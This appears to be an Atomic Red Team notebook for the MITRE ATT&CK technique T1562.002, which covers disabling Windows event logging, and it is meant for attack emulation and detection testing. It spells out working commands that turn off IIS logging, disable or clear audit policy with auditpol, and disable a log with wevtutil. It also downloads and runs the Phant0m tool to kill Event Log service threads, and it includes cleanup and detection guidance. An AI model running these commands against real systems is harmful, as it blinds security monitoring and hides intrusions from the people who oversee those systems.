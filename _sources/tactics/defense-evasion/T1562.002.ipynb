{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "c1d03eb9",
   "metadata": {},
   "source": "# T1562.002 - Disable Windows Event Logging\nAdversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the EventLog service may be disabled using the following PowerShell line: <code>Stop-Service -Name EventLog</code>.(Citation: Disable_Win_Event_Logging) Additionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind."
  },
  {
   "cell_type": "markdown",
   "id": "60435303",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "0290ddad",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Disable Windows IIS HTTP Logging",
    "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nC:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:true\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ad5ea183",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "6ab199bc",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nif(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){\n  C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:false *>$null\n}\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9411a138",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.002 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "46d2f88d",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Disable Windows IIS HTTP Logging via PowerShell",
    "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nset-WebConfigurationProperty -PSPath \"IIS:\\Sites\\Default Web Site\\\" -filter \"system.webServer/httpLogging\" -name dontLog -value $true\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cfb3a0da",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.002 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "46d0cb74",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nif(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){\n  C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:false *>$null\n}\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a2bb5611",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.002 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "84c294eb",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Kill Event Log Service Threads",
    "Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n$url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"\n$output = \"$env:TEMP\\Invoke-Phant0m.ps1\"\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\ncd $env:TEMP\nImport-Module .\\Invoke-Phant0m.ps1\nInvoke-Phant0m\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cecdd243",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.002 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "6fbd0c1a",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nWrite-Host \"NEED TO Restart-Computer TO ENSURE LOGGING RETURNS\" -fore red\nRemove-Item \"$env:TEMP\\Invoke-Phant0m.ps1\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "99a3e337",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.002 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "539ac42e",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Impair Windows Audit Log Policy",
    "Disables the windows audit policy to prevent key host based telemetry being written into the event logs.\n[Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nauditpol /set /category:\"Account Logon\" /success:disable /failure:disable\nauditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable\nauditpol /set /category:\"Detailed Tracking\" /success:disable\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2a1213d7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.002 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "ee872ae6",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nauditpol /set /category:\"Account Logon\" /success:enable /failure:enable\nauditpol /set /category:\"Detailed Tracking\" /success:enable\nauditpol /set /category:\"Logon/Logoff\" /success:enable /failure:enable\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "72e872a8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.002 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "74aeb7a4",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Clear Windows Audit Policy Config",
    "Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nauditpol /clear /y\nauditpol /remove /allusers\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "33704548",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.002 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "94373a47",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nauditpol /set /category:\"Account Logon\" /success:enable /failure:enable\nauditpol /set /category:\"Detailed Tracking\" /success:enable\nauditpol /set /category:\"Logon/Logoff\" /success:enable /failure:enable\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2f279967",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.002 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "98b21699",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Disable Event Logging with wevtutil",
    "Wevtutil can be used to disable logs. \nNOTE: RansomEXX ransomware uses this to disable Security logs post-encryption.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwevtutil sl \"Microsoft-Windows-IKE/Operational\" /e:false\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3ff7fb83",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.002 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "71fec4f6",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nwevtutil sl \"Microsoft-Windows-IKE/Operational\" /e:true\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3f92fc54",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.002 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6fd512e1",
   "metadata": {},
   "source": "### Atomic Test #7 - Makes Eventlog blind with Phant0m\nUse [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Phant0m.exe must exist on disk at specified location (#{file_name})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\T1562.002\\bin\\Phant0m.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path PathToAtomicsFolder\\T1562.002\\bin\\Phant0m.exe) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1562.002/bin/Phant0m.exe\" -OutFile \"PathToAtomicsFolder\\T1562.002\\bin\\Phant0m.exe\" -UseBasicParsing\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2f3078ed",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.002 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "58f0c2e6",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nPathToAtomicsFolder\\T1562.002\\bin\\Phant0m.exe\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "21c9f412",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.002 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "5495ac8a",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\necho \"Sorry you have to reboot\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3629c4d1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.002 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3a5b5d67",
   "metadata": {},
   "source": "## Detection\nMonitor processes and command-line arguments for commands that can be used to disable logging. For example, [Wevtutil](https://attack.mitre.org/software/S0645), `auditpol`, `sc stop EventLog`, and offensive tooling (such as [Mimikatz](https://attack.mitre.org/software/S0002) and `Invoke-Phant0m`) may be used to clear logs.(Citation: def_ev_win_event_logging)(Citation: evt_log_tampering)  \n\nIn Event Viewer, Event ID 1102 under the \u201cSecurity\u201d Windows Log and Event ID 104 under the \u201cSystem\u201d Windows Log both indicate logs have been cleared.(Citation: def_ev_win_event_logging) `Service Control Manager Event ID 7035` in Event Viewer may indicate the termination of the EventLog service.(Citation: evt_log_tampering) Additionally, gaps in the logs, e.g. non-sequential Event Record IDs, may indicate that the logs may have been tampered.\n\nMonitor the addition of the MiniNT registry key in `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control`, which may disable Event Viewer.(Citation: def_ev_win_event_logging)"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}